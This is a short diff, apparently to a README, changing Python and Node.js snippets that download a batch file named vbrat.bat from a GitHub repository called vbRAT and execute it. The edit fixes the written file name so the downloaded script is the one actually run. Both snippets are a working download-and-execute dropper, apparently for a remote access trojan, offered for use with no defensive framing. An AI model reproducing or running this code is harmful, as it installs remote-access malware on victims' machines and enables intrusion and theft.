@@ -35,7 +35,7 @@
 import requests, os
 _file = requests.get('https://raw.githubusercontent.com/4ksr/vbRAT/main/vbrat.bat')
 
-with open('demo.bat', 'w') as f:
+with open('vbrat.bat', 'w') as f:
     f.write(_file.text)
 
 os.startfile('vbrat.bat')
@@ -51,7 +51,7 @@ const axios = require('axios');
 axios.get('https://raw.githubusercontent.com/4ksr/vbRAT/main/vbrat.bat', {
     responseType: 'text',
   }).then((response) => {
-    fs.writeFileSync('demo.bat', response.data, { flag: 'a' }, (err) => {});
+    fs.writeFileSync('vbrat.bat', response.data, { flag: 'a' }, (err) => {});
   });
 exec('vbrat.bat');
 ```
